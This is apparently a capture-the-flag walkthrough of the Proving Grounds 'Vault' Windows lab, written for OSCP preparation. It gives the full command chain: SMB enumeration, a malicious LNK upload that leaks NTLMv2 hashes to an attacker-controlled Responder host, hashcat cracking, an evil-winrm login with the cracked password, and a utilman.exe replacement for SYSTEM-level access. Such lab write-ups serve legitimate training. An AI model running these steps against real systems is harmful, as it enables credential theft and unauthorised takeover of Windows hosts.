---
title: Vault Walkthrough - Proving grounds
tags: NTLMv2 SeRestorePrivilege
categories: Windows
---
In this entry I will solve the proving grounds Vault machine. It is a Windows machine in the TJ Null list. My purpose in sharing this post is to prepare for OSCP exam. It is also to show you the way if you are in trouble. Please try to understand each step and take notes.

# Service enumeration

`nmap -sC -sV -p135,139,53,3389,445,3269,9389,636,593,5985,389,88,464,3268 -Pn -o targeted.txt 192.168.219.172`

![046db56c571a4d9dba18aa347f708bde.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/046db56c571a4d9dba18aa347f708bde.png?raw=true)

# Samba enumeration

I can not connect witha  null session, so I try with "guest" username, also I try to bruteforce usernames using rid-brute parameter.

`crackmapexec smb 192.168.219.172 --shares -u 'guest' -p '' --rid-brute`

![d9e5a4c131df2fe0861e7a1d57d7fe27.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/d9e5a4c131df2fe0861e7a1d57d7fe27.png?raw=true)

I try asp reproast attack with the found users but I have no luck.

The previous image shows the permissions (Read & Write), as Ii can upload files to DocumentShare, I try to find a possible attack vector and I come across with this [post](https://vegardw.medium.com/using-lnk-files-to-steal-netntlmv2-hashes-while-living-off-the-land-63a10d35711d)

![678bcbd99a2fd7a22eec9206bc3bfcc3.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/678bcbd99a2fd7a22eec9206bc3bfcc3.png?raw=true)

# LNK file upload to steal NTLMv2 hashes

I find this [tool](https://github.com/dievus/lnkbomb) on Github that automates all the process

I start the responder in my attacker machine ready to get the hashes and run lnkbomb.py

`sudo responder -I tun0 -v`

`python3 lnkbomb.py -t 192.168.219.172 -a 192.168.45.201 -s DocumentsShare -u guest -p '' -n DC --windows`

![5b1ad1aa74da9d7b226b9c555ed66111.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/5b1ad1aa74da9d7b226b9c555ed66111.png?raw=true)

I check the file has been uploaded

![1a6eeb7824884ac399fa7a9a161b1314.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/1a6eeb7824884ac399fa7a9a161b1314.png?raw=true)

I go back to the responder tab and the hash for anirudh user is shown

![789293711a0c18b39557a9ff0b4e6fa3.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/789293711a0c18b39557a9ff0b4e6fa3.png?raw=true)

Then I crack it , fort that, i copy paste the hash to a file and then run hashcat

![e807728b98806e04ba8b73d24b072830.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/e807728b98806e04ba8b73d24b072830.png?raw=true)

`hashcat hash.txt /usr/share/wordlists/rockyou.txt`

![2b0e143db1e92c6202312b8f94c58da2.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/2b0e143db1e92c6202312b8f94c58da2.png?raw=true)

After getting the password, I log in with evilwinrm to the victim machine

`evil-winrm -i vault.offsec -u 'ANIRUDH' -p 'SecureHM'`

# Privesc SeRestorePrivilege

Running `whoami /priv` I get the following:

![03379d084d672c9a4a2c0b37856217f7.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/03379d084d672c9a4a2c0b37856217f7.png?raw=true)

I find on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) a way to escalate

![1d81924e1788e9a749e6a4824eff0081.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/1d81924e1788e9a749e6a4824eff0081.png?raw=true)

I run

`mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old`

`mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`

Then, connect though rdp and do WIN+U, a cmd will appear with Adminsitrator privileges

`rdesktop 192.168.219.172`

![1604b85701f435f32d8bfcb13422dcdc.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Vault/1604b85701f435f32d8bfcb13422dcdc.png?raw=true)

Pwn3d! :D
